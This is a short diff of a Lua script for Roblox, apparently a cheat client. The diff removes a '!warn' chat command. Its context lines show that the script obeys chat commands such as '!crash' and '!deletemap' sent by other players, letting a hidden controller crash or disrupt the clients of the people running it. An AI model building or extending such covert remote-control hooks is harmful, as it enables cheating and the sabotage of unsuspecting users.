@@ -15,14 +15,6 @@ end
 function funcs:reset()
 	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
 end
-function funcs:warn(Tag1, Tag2)
-        Tag1 = Tag1 or "Owner"
-	Tag2 = Tag2 or "Hi I am Owner"
-	if shared.GuiLibrary then
-		local GL = shared.GuiLibrary
-		warningNotification("Tag1", "Tag2", 60)
-	end
-end
 function funcs:kill2()
 	lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 end
@@ -314,8 +306,6 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:unfreeze()
 			elseif a == "!deletemap" then
 				funcs:deletemap()
-			elseif a == "!warn" then
-				funcs:warn()
 			elseif a == "!crash" then
 				funcs:crash()
 			elseif a == "!chipman" then
@@ -361,8 +351,6 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:unfreeze()
 			elseif a == "!deletemap" then
 				funcs:deletemap()
-                        elseif a == "!warn" then
-				funcs:warn()
 			elseif a == "!crash" then
 				funcs:crash()
 			elseif a == "!chipman" then
